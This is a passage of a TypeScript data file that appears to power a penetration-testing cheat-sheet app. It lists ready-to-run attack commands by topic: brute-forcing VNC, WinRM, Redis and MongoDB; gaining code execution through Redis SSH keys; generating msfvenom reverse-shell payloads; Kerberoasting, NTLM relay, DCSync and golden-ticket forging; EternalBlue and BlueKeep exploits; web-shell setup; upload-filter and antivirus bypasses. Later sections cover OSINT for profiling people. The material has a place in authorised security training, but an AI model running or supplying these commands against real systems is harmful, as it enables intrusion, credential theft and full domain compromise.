  },
  {
     id: 'exploit-vnc',
     name: 'VNC (5900)',
     icon: 'fa-tv',
     description: 'Virtual Network Computing.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'Brute Force', code: 'hydra -P <PASS_LIST> -f <TARGET> vnc' }
         ]
       }
     ],
     whatToLookFor: [
       'No Authentication: Open access.',
       'Weak Passwords: VNC limits passwords to 8 chars.',
       'Version Exploits: RealVNC 4.1.1 Authentication Bypass.'
     ]
  },
  {
     id: 'exploit-winrm',
     name: 'WinRM (5985)',
     icon: 'fa-windows',
     description: 'Windows Remote Management.',
     tools: [
       {
         name: 'CrackMapExec',
         description: 'Brute Force',
         commands: [
           { label: 'Spray', code: 'nxc winrm <TARGET> -u <USER_LIST> -p <PASS_LIST>' }
         ]
       },
       {
           name: 'Evil-WinRM',
           description: 'Shell Access',
           commands: [{ label: 'Connect', code: 'evil-winrm -i <TARGET> -u <USER> -p <PASS>' }]
       }
     ],
     whatToLookFor: [
       'Valid Credentials: Need a user in "Remote Management Users" group.',
       'Shell Access: Evil-WinRM provides a stable PowerShell session.',
       'Pass-the-Hash: Supports NTLM hash auth.'
     ]
  },
  {
     id: 'exploit-redis',
     name: 'Redis (6379)',
     icon: 'fa-layer-group',
     description: 'In-memory Data Structure Store.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'If auth enabled',
         commands: [
           { label: 'Brute Force', code: 'hydra -P <PASS_LIST> <TARGET> redis' }
         ]
       },
       {
           name: 'RCE',
           description: 'Write SSH Key',
           commands: [
               { label: 'Config Set', code: 'redis-cli -h <TARGET> config set dir /root/.ssh/' },
               { label: 'Write Key', code: 'redis-cli -h <TARGET> config set dbfilename "authorized_keys"' }
           ]
       }
     ],
     whatToLookFor: [
       'Unauthenticated Access: Full control over data.',
       'RCE: Writing SSH keys to /root/.ssh/authorized_keys.',
       'Webshell: Writing PHP shell to /var/www/html.',
       'Lua Sandbox Bypass: Older versions CVEs.'
     ]
  },
  {
     id: 'exploit-elastic',
     name: 'Elasticsearch (9200)',
     icon: 'fa-search',
     description: 'Exploiting Elasticsearch.',
     tools: [
       {
         name: 'Data Extraction',
         description: 'Dump Indices',
         commands: [
           { label: 'Search All', code: 'curl http://<TARGET>:9200/_search?pretty' },
           { label: 'Dump Index', code: 'elasticdump --input=http://<TARGET>:9200/<PATH> --output=./dump.json --type=data' }
         ]
       },
       {
           name: 'Exploits',
           description: 'SearchSploit',
           commands: [{ label: 'Search', code: 'searchsploit elasticsearch' }]
       }
     ],
     whatToLookFor: [
       'RCE: CVE-2014-3120 (Groovy), CVE-2015-1427.',
       'Data Leakage: PII, credentials, logs in indices.',
       'Kibana: Check port 5601 for visualization dashboard.'
     ]
  },
  {
     id: 'exploit-mongo',
     name: 'MongoDB (27017)',
     icon: 'fa-database',
     description: 'NoSQL Database.',
     tools: [
       {
         name: 'Hydra Brute Force',
         description: 'Password attacks',
         commands: [
           { label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> mongodb' }
         ]
       },
       {
           name: 'NoSQL Map',
           description: 'Automated Injection',
           commands: [{ label: 'Attack', code: 'python NoSQLMap.py' }]
       }
     ],
     whatToLookFor: [
       'No Authentication: Direct access to all data.',
       'NoSQL Injection: Extracting data via web apps.',
       'Sensitive Data: User passwords, tokens, API keys.'
     ]
  },
  {
    id: 'payloads',
    name: 'Payload Generation',
    icon: 'fa-rocket',
    description: 'Generate reverse shells and payloads.',
    tools: [
      {
        name: 'MSFVenom Linux',
        description: 'Linux ELF Reverse Shell',
        commands: [{ label: 'Generate ELF', code: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f elf -o shell.elf' }]
      },
      {
        name: 'MSFVenom Windows',
        description: 'Windows Exe Reverse Shell',
        commands: [{ label: 'Generate EXE', code: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f exe -o shell.exe' }]
      },
      {
        name: 'Netcat Listener',
        description: 'Catch the shell',
        commands: [{ label: 'Listen', code: 'nc -lvnp <PORT>' }]
      }
    ],
    whatToLookFor: [
      'Bad Characters: Avoid null bytes in shellcode.',
      'Architecture: Match x86/x64 to target.',
      'Evasion: Encoding payloads (shikata_ga_nai) to bypass AV.'
    ]
  }
];

export const AD_ATTACK_TOPICS: AdAttackTopic[] = [
  {
    id: 'poisoning',
    name: 'LLMNR/NBT-NS Poisoning',
    icon: 'fa-skull-crossbones',
    description: 'Responding to broadcast requests to steal hashes.',
    tools: [
      {
        name: 'Responder',
        description: 'Automated poisoner and hash capturer.',
        commands: [{ label: 'Run', code: 'responder -I <INTERFACE> -wrd' }]
      }
    ],
    whatToLookFor: [
      'NTLMv2 Hashes: Capture and crack offline (Hashcat 5600).',
      'SMB Relay Targets: Hosts with SMB Signing disabled.',
      'WPAD: Web Proxy Auto-Discovery poisoning.'
    ]
  },
  {
    id: 'as-rep-roasting',
    name: 'Kerberos: AS-REP Roasting',
    icon: 'fa-fire',
    description: 'Attacking users with "Do not require Kerberos preauthentication".',
    tools: [
      {
        name: 'Impacket',
        commands: [
          { label: 'Auto-Enum', code: 'impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -request -dc-ip <DC_IP> -format hashcat -outputfile asrep.hashes' },
          { label: 'User List', code: 'impacket-GetNPUsers <DOMAIN>/ -usersfile <USER_LIST> -dc-ip <DC_IP> -format hashcat -outputfile asrep.hashes' }
        ]
      },
      {
        name: 'Rubeus',
        commands: [{ label: 'ASREPRoast', code: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes' }]
      }
    ],
    whatToLookFor: [
      'Pre-Auth Disabled: Accounts susceptible to offline cracking.',
      'Hashcat: Use mode 18200 to crack.'
    ]
  },
  {
    id: 'kerberoasting',
    name: 'Kerberos: Kerberoasting',
    icon: 'fa-fire-alt',
    description: 'Requesting TGS tickets for service accounts to crack offline.',
    tools: [
      {
        name: 'Impacket',
        commands: [{ label: 'GetUserSPNs', code: 'GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -request -outputfile kerberoast.hashes' }]
      },
      {
        name: 'Rubeus',
        commands: [{ label: 'Kerberoast', code: 'Rubeus.exe kerberoast /outfile:kerberoast.hashes' }]
      }
    ],
    whatToLookFor: [
      'Service Accounts: Users with SPN set.',
      'Weak Passwords: TGS tickets are encrypted with user NTLM hash.',
      'Cracking: Use Hashcat mode 13100.'
    ]
  },
  {
    id: 'ntlm-relay',
    name: 'NTLM Relay Attacks',
    icon: 'fa-exchange-alt',
    description: 'Relaying captured NTLM authentication to other machines.',
    tools: [
      {
        name: 'Preparation',
        description: 'Disable SMB and HTTP in Responder.',
        commands: [{ label: 'Edit Conf', code: 'sudo sed -i "s/SMB = On/SMB = Off/g" /etc/responder/Responder.conf && sudo sed -i "s/HTTP = On/HTTP = Off/g" /etc/responder/Responder.conf' }]
      },
      {
        name: 'NTLMRelayx',
        description: 'Relay attacks via Impacket.',
        commands: [
          { label: 'Relay to SMB', code: 'impacket-ntlmrelayx -tf targets.txt -smb2support' },
          { label: 'SOCKS Proxy', code: 'impacket-ntlmrelayx -tf targets.txt -socks -smb2support' },
          { label: 'DCSync via LDAP', code: 'impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user <USER>' }
        ]
      }
    ],
    whatToLookFor: [
      'SMB Signing Disabled: Run NetExec to identify targets.',
      'Privileged Users: Relaying Admin creds gives immediate shell.',
      'LDAP Signing: If disabled, allows escalation via group modification.'
    ]
  },
  {
    id: 'acl-abuse-bloodyad',
    name: 'ACL Abuse & Object Manipulation',
    icon: 'fa-user-edit',
    description: 'Abusing specific ACEs to take over objects with bloodyAD.',
    tools: [
      {
        name: 'ForceChangePassword',
        description: 'Reset a user\'s password (requires ForceChangePassword or GenericAll).',
        commands: [
          { label: 'Set Password', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> set password <TARGET_USER> <NEW_PASS>' }
        ]
      },
      {
        name: 'AddMembers',
        description: 'Add a user to a group (requires AddMembers, GenericWrite, or GenericAll on group).',
        commands: [
          { label: 'Add User to Group', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> add groupMember <TARGET_GROUP> <TARGET_USER>' }
        ]
      },
      {
        name: 'GenericWrite',
        description: 'Abuse write access to attributes (SPN, scriptPath).',
        commands: [
          { label: 'Targeted Kerberoast (SPN)', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> add object <TARGET_USER> servicePrincipalName -v "hack/me"' },
          { label: 'Malicious Script Path', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> set object <TARGET_USER> scriptPath -v "\\\\<LHOST>\\share\\script.bat"' }
        ]
      },
      {
        name: 'WriteDACL / WriteOwner',
        description: 'Modify security descriptors.',
        commands: [
          { label: 'Grant FullControl', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> add dacl <TARGET_USER> <USER> -p GenericAll' },
          { label: 'Take Ownership', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> set owner <TARGET_USER> <USER>' }
        ]
      },
      {
        name: 'Read LAPS',
        description: 'Read local admin passwords (ms-Mcs-AdmPwd).',
        commands: [
          { label: 'Get LAPS Password', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> get object <TARGET_USER> --attr ms-Mcs-AdmPwd' }
        ]
      },
      {
        name: 'Read gMSA Password',
        description: 'Read Group Managed Service Account password (msDS-ManagedPassword).',
        commands: [
          { label: 'Get gMSA Password', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> get object <TARGET_USER> --attr msDS-ManagedPassword' }
        ]
      },
      {
        name: 'Shadow Credentials',
        description: 'Key Credential Link (requires GenericWrite/All).',
        commands: [
          { label: 'Add Key Credential', code: 'bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> add shadowCredentials <TARGET_USER>' }
        ]
      }
    ],
    whatToLookFor: [
      'ForceChangePassword: Reset target password.',
      'AddMembers: Add self to Domain Admins.',
      'GenericWrite: Set SPN to roast, or scriptPath for code execution.',
      'AllExtendedRights: Implies ForceChangePassword.',
      'ReadProperty: Read LAPS or sensitive descriptions.',
      'ReadGMSAPassword: Read managed password attribute.'
    ]
  },
  {
    id: 'ad-cs',
    name: 'AD CS (Certificates)',
    icon: 'fa-certificate',
    description: 'Exploiting Active Directory Certificate Services.',
    tools: [
      {
        name: 'Certipy',
        description: 'Enumeration and exploitation of AD CS.',
        commands: [
          { label: 'Find Vulnerable', code: 'certipy find -vulnerable -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -stdout' },
          { label: 'ESC1 Attack', code: 'certipy req -u <USER>@<DOMAIN> -p <PASS> -ca <CA_NAME> -target <DC_IP> -template <TEMPLATE> -upn administrator@<DOMAIN>' },
          { label: 'Shadow Credentials', code: 'certipy shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET_USER>' }
        ]
      }
    ],
    whatToLookFor: [
      'ESC1: Template allows SAN (Subject Alt Name) injection.',
      'ESC8: NTLM Relay to HTTP web enrollment.',
      'Vulnerable Templates: Client Authentication EKU + Enrollee Supplies Subject.'
    ]
  },
  {
    id: 'domain-dominance',
    name: 'Domain Dominance',
    icon: 'fa-crown',
    description: 'Post-exploitation techniques for full control.',
    tools: [
      {
        name: 'DCSync',
        description: 'Replicating secrets from the DC.',
        commands: [
          { label: 'Secretsdump', code: 'secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>' },
          { label: 'Specific User', code: 'secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user <TARGET_USER>' }
        ]
      },
      {
        name: 'Golden Ticket',
        description: 'Forging TGTs.',
        commands: [
          { label: 'Mimikatz', code: 'kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /id:500' },
          { label: 'Impacket', code: 'ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator' }
        ]
      }
    ],
    whatToLookFor: [
      'KRBTGT Hash: The key to Golden Tickets.',
      'DCSync Rights: Replicating Directory Changes.',
      'AdminSDHolder: Persistence mechanism.'
    ]
  }
];

export const INFILTRATION_TOPICS: InfiltrationTopic[] = [
  {
    id: 'windows-recon',
    name: 'Infiltrating Windows',
    icon: 'fa-windows',
    description: 'Reconnaissance, Exploitation, and Post-Exploitation steps for Windows environments.',
    tools: [
      {
        name: 'Common Exploits',
        description: 'References for well-known Windows vulnerabilities.',
        commands: [
          { label: 'EternalBlue (MS17-010)', code: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET>; run"' },
          { label: 'BlueKeep (CVE-2019-0708)', code: 'msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <TARGET>; run"' }
        ]
      }
    ],
    whatToLookFor: [
      'TTL=128 usually indicates Windows',
      'Missing Patches: MS17-010, BlueKeep, ZeroLogon.',
      'Misconfigurations: AlwaysInstallElevated, Unquoted Service Paths.',
      'Creds in Files: unattend.xml, web.config, groups.xml (GPP).',
      'Payloads: .exe, .msi, .bat, .ps1, .hta.'
    ]
  },
  {
    id: 'linux-recon',
    name: 'Infiltrating Linux',
    icon: 'fa-linux',
    description: 'Strategies for gaining access to Unix/Linux systems.',
    tools: [
      {
        name: 'Initial Recon',
        description: 'Identifying Linux services and web apps.',
        commands: [
          { label: 'Full Scan', code: 'nmap -sC -sV <TARGET>' }
        ]
      },
      {
        name: 'rConfig Exploit',
        description: 'Example: Exploiting rConfig v3.9.6 (Authenticated RCE)',
        commands: [
          { label: 'Search Module', code: 'msf6 > search rconfig' },
          { label: 'Use Exploit', code: 'use exploit/linux/http/rconfig_vendors_auth_file_upload_rce' }
        ]
      },
      {
        name: 'TTY Upgrade',
        description: 'Stabilize a shell using Python',
        commands: [
          { label: 'Python Spawn', code: 'python -c \'import pty; pty.spawn("/bin/sh")\'' }
        ]
      }
    ],
    whatToLookFor: [
      'TTL=64 usually indicates Linux',
      'SUID Binaries: `find / -perm -4000 2>/dev/null`',
      'Sudo Rights: `sudo -l` (check GTFOBins).',
      'Cron Jobs: Writable scripts running as root.',
      'Kernel Exploits: DirtyCow, PwnKit.'
    ]
  }
];

export const OS_FINGERPRINT_TOPICS: OsFingerprintTopic[] = [
  {
    id: 'windows',
    name: 'Windows Fingerprinting',
    icon: 'fa-windows',
    description: 'Identifying Windows systems based on TTL and responses.',
    tools: [
      {
        name: 'TTL Detection',
        description: 'Windows typically has a TTL of 128.',
        commands: [
          { label: 'Ping Check', code: 'ping <TARGET>' }
        ]
      },
      {
         name: 'Nmap OS Detection',
         description: 'Active fingerprinting.',
         commands: [
            { label: 'OS Scan', code: 'sudo nmap -v -O <TARGET>' }
         ]
      },
      {
          name: 'Banner Grabbing',
          description: 'Service banners often reveal OS.',
          commands: [
              { label: 'Nmap Banner', code: 'nmap -v <TARGET> --script banner.nse' }
          ]
      }
    ],
    whatToLookFor: [
      'TTL ~= 128 (Windows)',
      'Ports: 135, 139, 445, 3389 usually open.',
      'IIS Headers: Microsoft-IIS/10.0',
      'RDP Screenshot: Can verify OS version.'
    ]
  },
  {
    id: 'linux',
    name: 'Linux/Unix Fingerprinting',
    icon: 'fa-linux',
    description: 'Identifying Linux systems.',
    tools: [
       {
        name: 'TTL Detection',
        description: 'Linux typically has a TTL of 64.',
        commands: [
          { label: 'Ping Check', code: 'ping <TARGET>' }
        ]
      },
      {
         name: 'Nmap OS Detection',
         description: 'Active fingerprinting.',
         commands: [
            { label: 'OS Scan', code: 'sudo nmap -v -O <TARGET>' }
         ]
      }
    ],
    whatToLookFor: [
      'TTL ~= 64 (Linux)',
      'Ports: 22, 111, 2049, 80/443.',
      'SSH Banner: Ubuntu, Debian, CentOS version string.',
      'Web Server: Apache, Nginx (often on Linux).'
    ]
  }
];

export const SHELL_TOPICS: ShellTopic[] = [
  {
    id: 'tty-spawning',
    name: 'Spawning Interactive Shells',
    icon: 'fa-terminal',
    description: 'Techniques to upgrade a limited shell to a full TTY interactive shell.',
    tools: [
      {
        name: 'Interpreters',
        description: 'Using installed languages to spawn a shell.',
        commands: [
          { label: 'Python 3', code: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'' },
          { label: 'Python', code: 'python -c \'import pty; pty.spawn("/bin/sh")\'' },
          { label: 'Perl', code: 'perl —e \'exec "/bin/sh";\'' },
          { label: 'Ruby', code: 'ruby: exec "/bin/sh"' },
          { label: 'Lua', code: 'lua: os.execute(\'/bin/sh\')' },
          { label: 'AWK', code: 'awk \'BEGIN {system("/bin/sh")}\'' }
        ]
      },
      {
        name: 'System Binaries',
        description: 'Using standard Linux binaries to break out.',
        commands: [
          { label: 'Interactive SH', code: '/bin/sh -i' },
          { label: 'Find Exec', code: 'find . -exec /bin/sh \\; -quit' },
          { label: 'Vim Escape', code: ':!/bin/sh' },
          { label: 'Vim Shell', code: ':set shell=/bin/sh\n:shell' }
        ]
      }
    ],
    whatToLookFor: [
      'Check available binaries: `which python`, `which perl`, etc.',
      'Shell Restrictions: rbash? (Restricted Bash).',
      'Path: Can you execute binaries outside your path?',
      'Interactive: Does `sudo -l` require a password? You need a TTY.'
    ]
  }
];

export const WEB_SHELL_TOPICS: WebShellTopic[] = [
  {
    id: 'laudanum',
    name: 'Laudanum',
    icon: 'fa-flask',
    description: 'Repository of injectable files (ASP, ASPX, JSP, PHP) for reverse shells.',
    tools: [
      {
        name: 'Laudanum Setup',
        description: 'Preparing the shell for injection.',
        commands: [
          { label: 'Locate Files', code: 'ls -la /usr/share/laudanum' },
          { label: 'Copy ASPX', code: 'cp /usr/share/laudanum/aspx/shell.aspx /home/kali/demo.aspx' },
          { label: 'Configure IP', code: 'nano demo.aspx\n(Edit allowedIps variable to your IP)' }
        ]
      }
    ],
    whatToLookFor: [
       'Target Language: Does the server support PHP, ASP, JSP?',
       'IP Whitelisting: Modify the shell to accept your attacking IP.',
       'Obfuscation: Remove comments/ASCII art to bypass WAF/AV.',
       'Execution: Navigate to the uploaded file URL to trigger.'
    ]
  },
  {
    id: 'antak',
    name: 'Antak Webshell',
    icon: 'fa-windows',
    description: 'ASP.NET web shell utilizing PowerShell (Part of Nishang).',
    tools: [
         {
            name: 'Antak Setup',
            description: 'Preparing Antak for Windows IIS targets.',
            commands: [
              { label: 'Locate Antak', code: 'ls -la /usr/share/nishang/Antak-WebShell' },
              { label: 'Copy Shell', code: 'cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/kali/Upload.aspx' },
              { label: 'Edit Creds', code: 'nano Upload.aspx\n(Set user/pass for shell access)' }
            ]
         }
    ],
    whatToLookFor: [
        'IIS Servers: Look for .aspx endpoints.',
        'PowerShell Access: Antak wraps PS commands.',
        'Credentials: Set strong auth in the shell file before upload.',
        'Post-Exploit: Use it to download legitimate C2 agents.'
    ]
  },
  {
     id: 'bypass',
     name: 'Upload Bypass',
     icon: 'fa-shield-alt',
     description: 'Techniques to bypass file upload restrictions to upload web shells.',
     tools: [
         {
             name: 'Content-Type Bypass',
             description: 'Burp Suite modification to trick file type checks.',
             commands: [
                 { label: 'Change MIME', code: 'Intercept request -> Change "Content-Type: application/x-php" to "Content-Type: image/gif"' }
             ]
         },
         {
             name: 'Magic Bytes',
             description: 'Fake file signature to bypass content inspection.',
             commands: [
                 { label: 'GIF Header', code: 'Add "GIF89a;" at the very start of the PHP file.' }
             ]
         },
         {
             name: 'Extension Bypass',
             description: 'Try alternative extensions.',
             commands: [
                 { label: 'PHP Alts', code: '.php3, .php4, .php5, .phtml' },
                 { label: 'Double Ext', code: 'shell.jpg.php' }
             ]
         }
     ],
     whatToLookFor: [
         'Client-side validation: Disable JS or use Burp to bypass.',
         'MIME Type: Server might trust "image/png" header.',
         'Extensions: Blacklist (.php blocked) vs Whitelist (only .jpg allowed).',
         'File Content: Server might check for "<?php" tag (use short tags or encoding).'
     ]
  }
];

export const OSINT_TOPICS: OsintTopic[] = [
  {
    id: 'infra',
    name: 'Infrastructure',
    icon: 'fa-server',
    description: 'Domain and infrastructure discovery.',
    tools: [
      {
        name: 'TheHarvester',
        description: 'Gather emails, subdomains, hosts.',
        commands: [{ label: 'Scan', code: 'theHarvester -d <DOMAIN> -b all' }]
      },
      {
        name: 'Amass',
        description: 'In-depth DNS enumeration.',
        commands: [{ label: 'Enum', code: 'amass enum -d <DOMAIN>' }]
      }
    ],
    whatToLookFor: ['Subdomains', 'IP Ranges', 'Cloud Assets']
  },
  {
    id: 'cloud-enum',
    name: 'Cloud Recon',
    icon: 'fa-cloud',
    description: 'Enumerate AWS, Azure, and GCP assets.',
    tools: [
      {
        name: 'Cloud_Enum',
        description: 'Multi-cloud enumeration tool.',
        commands: [{ label: 'Scan', code: 'cloud_enum -k <COMPANY> -k <DOMAIN>' }]
      },
      {
        name: 'GCPBucketBrute',
        description: 'Google Storage buckets.',
        commands: [{ label: 'Scan', code: 'python3 gcpbucketbrute.py -k <COMPANY>' }]
      }
    ],
    whatToLookFor: ['Open Buckets', 'Exposed Storage', 'Public Permissions']
  },
  {
    id: 'email-intel',
    name: 'Email Intel',
    icon: 'fa-envelope',
    description: 'Email address gathering and breach data.',
    tools: [
        {
            name: 'Hunter.io',
            description: 'Find email addresses.',
            commands: [{label: 'Search', code: 'Using API Key: <HUNTER_API_KEY>'}]
        },
        {
            name: 'h8mail',
            description: 'Password breach hunting.',
            commands: [{label: 'Scan', code: 'h8mail -t <EMAIL>'}]
        }
    ],
    whatToLookFor: ['Valid emails', 'Breached passwords', 'Naming conventions']
  },
  {
    id: 'phone-intel',
    name: 'Phone Intel',
    icon: 'fa-phone',
    description: 'Gather information from phone numbers.',
    tools: [
      {
        name: 'PhoneInfoga',
        description: 'Advanced phone OSINT.',
        commands: [{ label: 'Scan', code: 'phoneinfoga scan -n <PHONE>' }]
      }
    ],
    whatToLookFor: ['Carrier Info', 'Location Data', 'Social Accounts']
  },
  {
    id: 'ip-intel',
    name: 'IP Intelligence',
    icon: 'fa-map-marker-alt',
    description: 'Geolocation and reputation of IPs.',
    tools: [
      {
        name: 'IPinfo',
        description: 'IP details.',
        commands: [{ label: 'Curl', code: 'curl ipinfo.io/<IP>' }]
      }
    ],
    whatToLookFor: ['ISP', 'Location', 'Hosting Provider']
  },
  {
    id: 'malware',
    name: 'Malware Analysis',
    icon: 'fa-bug',
    description: 'Hash checks and reputation.',
    tools: [
      {
        name: 'VirusTotal',
        description: 'Check file hash.',
        commands: [{ label: 'Check Hash', code: 'vt file <HASH> --apikey <VT_API_KEY>' }]
      }
    ],
    whatToLookFor: ['Detection Ratio', 'Community Comments', 'Associated Domains']
  },
  {
    id: 'dark-web',
    name: 'Dark Web',
    icon: 'fa-user-secret',
    description: 'Tor hidden services.',
    tools: [
      {
        name: 'OnionSearch',
        description: 'Search Tor.',
        commands: [{ label: 'Search', code: 'onionsearch "<TOPIC>" --proxy 127.0.0.1:9050' }]
      }
    ],
    whatToLookFor: ['Marketplaces', 'Leaked Data', 'Forums']
  },
  {
    id: 'socmint',
    name: 'Social Media',
    icon: 'fa-user-friends',
    description: 'Social Media Intelligence.',
    tools: [
        {
            name: 'Sherlock',
            description: 'Find usernames across social networks.',
            commands: [{label: 'Search', code: 'sherlock <USERNAME>'}]
        }
    ],
    whatToLookFor: ['User profiles', 'Connections', 'Posts/Activity']
  },
  {
    id: 'wireless',
    name: 'Wireless',
    icon: 'fa-wifi',
    description: 'WiFi networks and BSSIDs.',
    tools: [
      {
        name: 'WiGLE',
        description: 'Wireless Network Search.',
        commands: [{ label: 'Search SSID', code: 'Using WiGLE API for SSID: <SSID>' }]
      }
    ],
    whatToLookFor: [' precise Location', 'Encryption Type', 'Last Seen']
  },
  {
    id: 'geo-intel',
    name: 'Geospatial',
    icon: 'fa-globe-americas',
    description: 'Satellite and map data.',
    tools: [
      {
        name: 'SunCalc',
        description: 'Shadow analysis.',
        commands: [{ label: 'Open', code: 'Browser: suncalc.org' }]
      }
    ],
    whatToLookFor: ['Time of Day', 'Landmarks', 'Terrain']
  },
  {
    id: 'transport',
    name: 'Transport',
    icon: 'fa-plane',
    description: 'Planes and Ships.',
    tools: [
      {
        name: 'FlightAware',
        description: 'Flight tracking.',
        commands: [{ label: 'Track', code: 'Search FlightAware for tail numbers' }]
      }
    ],
    whatToLookFor: ['Travel History', 'Current Location', 'Ownership']
  },
  {
    id: 'foia',
    name: 'FOIA Requests',
    icon: 'fa-file-contract',
    description: 'Freedom of Information Act.',
    tools: [
      {
        name: 'FOIA Mapper',
        description: 'Find agency contacts.',
        commands: [{ label: 'Search', code: 'Search for <AGENCY> contacts' }]
      }
    ],
    whatToLookFor: ['Response Time', 'Logs', 'Request Templates']
  },
  {
    id: 'finint',
    name: 'Financial Intel',
    icon: 'fa-chart-line',
    description: 'Corporate financials and bribery tracking.',
    tools: [
      {
        name: 'OpenCorporates',
        description: 'Global company database.',
        commands: [{ label: 'Search', code: 'Search <COMPANY> for officers' }]
      }
    ],
    whatToLookFor: ['Shell Companies', 'Offshore Accounts', 'Director Links']
  },
  {
    id: 'leo-databases',
    name: 'LEO Databases',
    icon: 'fa-gavel',
    description: 'Police misconduct records.',
    tools: [
      {
        name: 'Giglio List',
        description: 'Untruthful officer records.',
        commands: [{ label: 'Search', code: 'Search <NAME> in Giglio/Brady lists' }]
      }
    ],
    whatToLookFor: ['Disciplinary Records', 'Use of Force', 'Complaints']
  },
  {
    id: 'leo-litigation',
    name: 'LEO Litigation',
    icon: 'fa-balance-scale',
    description: 'Court cases involving officers.',
    tools: [
      {
        name: 'PACER',
        description: 'Federal court records.',
        commands: [{ label: 'Search', code: 'Search party <NAME>' }]
      }
    ],
    whatToLookFor: ['Civil Rights Lawsuits', 'Settlements', 'Testimony']
  },
  {
    id: 'leo-social',
    name: 'LEO Social',
    icon: 'fa-hashtag',
    description: 'Officer social media analysis.',
    tools: [
      {
        name: 'Social Search',
        description: 'Cross-platform search.',
        commands: [{ label: 'Search', code: 'Search <NAME> + <AGENCY> on FB/Twitter' }]
      }
    ],
    whatToLookFor: ['Bias indicators', 'Unprofessional conduct', 'Affiliations']
  },
  {
    id: 'search',
    name: 'Search Engines',
    icon: 'fa-search',
    description: 'Advanced dorking.',
    tools: [
      {
        name: 'Google Dorks',
        description: 'File discovery.',
        commands: [{ label: 'PDFs', code: 'site:<DOMAIN> filetype:pdf' }]
      }
    ],
    whatToLookFor: ['Confidential Docs', 'Login Pages', 'Config Files']
  },
  {
    id: 'metadata',
    name: 'Metadata',
    icon: 'fa-info',
    description: 'File metadata analysis.',
    tools: [
      {
        name: 'ExifTool',
        description: 'Extract metadata.',
        commands: [{ label: 'Extract', code: 'exiftool <FILE>' }]
      }
    ],
    whatToLookFor: ['GPS Coords', 'Author Name', 'Software Version']
  },
  {
    id: 'ctlogs',
    name: 'Cert Transparency',
    icon: 'fa-certificate',
    description: 'SSL Certificate logs.',
    tools: [
      {
        name: 'Crt.sh',
        description: 'Search CT logs.',
        commands: [{ label: 'Search', code: 'https://crt.sh/?q=<DOMAIN>' }]
      }
    ],
    whatToLookFor: ['Subdomains', 'Old Domains', 'Email Addresses']
  },
  {
    id: 'whois',
    name: 'Whois',
    icon: 'fa-id-card',
    description: 'Domain registration info.',
    tools: [
      {
        name: 'Whois CLI',
        description: 'Query whois.',
        commands: [{ label: 'Query', code: 'whois <DOMAIN>' }]
      }
    ],
    whatToLookFor: ['Registrar', 'Name Servers', 'Contact Info']
  }
];

export const WEB_ENUM_TOPICS: WebEnumTopic[] = [
    {
        id: 'subdomains',
        name: 'Subdomains',
        icon: 'fa-sitemap',
        description: 'Discovering subdomains.',
        tools: [
            {
                name: 'Sublist3r',
                description: 'Fast enumeration.',
                commands: [{label: 'Run', code: 'sublist3r -d <DOMAIN>'}]
            },
            {
                name: 'FFuF',
                description: 'Fuzzing subdomains.',
                commands: [{label: 'Fuzz', code: 'ffuf -w <WORDLIST> -u https://FUZZ.<DOMAIN>'}]
            }
        ],
        whatToLookFor: ['Dev sites', 'Admin panels', 'Internal portals']
    },
    {
        id: 'tech-stack',
        name: 'Tech Stack',
        icon: 'fa-layer-group',
        description: 'Identifying technologies.',
        tools: [
            {
                name: 'WhatWeb',
                description: 'Web scanner.',
                commands: [{label: 'Scan', code: 'whatweb <URL>'}]
            },
            {
                name: 'Wappalyzer',
                description: 'Browser extension / CLI.',
                commands: [{label: 'CLI', code: 'wappalyzer <URL>'}]
            }
        ],
        whatToLookFor: ['CMS', 'Frameworks', 'Server version']
    },
    {
        id: 'virtual-hosts',
        name: 'Virtual Hosts',
        icon: 'fa-server',
        description: 'Finding VHosts on same IP.',
        tools: [
            {
                name: 'Gobuster VHost',
                description: 'Brute force VHosts.',
                commands: [{label: 'Scan', code: 'gobuster vhost -u <URL> -w <WORDLIST>'}]
            }
        ],
        whatToLookFor: ['Internal apps', 'Staging sites']
    }
];

export const AD_ENUM_TOPICS: AdEnumTopic[] = [
    {
        id: 'domain-discovery',
        name: 'Domain Discovery',
        icon: 'fa-globe',
        description: 'Map out the domain.',
        tools: [
            {
                name: 'Adidnsdump',
                description: 'Dump DNS.',
                commands: [{label: 'Run', code: 'adidnsdump -u <USER> -p <PASS> <DC_IP>'}]
            },
            {
                name: 'LDAPS Discovery',
                description: 'Enumeration via SSL.',
                commands: [
                    { label: 'Check Cert', code: 'openssl s_client -connect <DC_IP>:636 -showcerts' },
                    { label: 'Ldapsearch SSL', code: 'ldapsearch -x -H ldaps://<DC_IP> -b "DC=<DOMAIN>,DC=LOCAL" -s sub' }
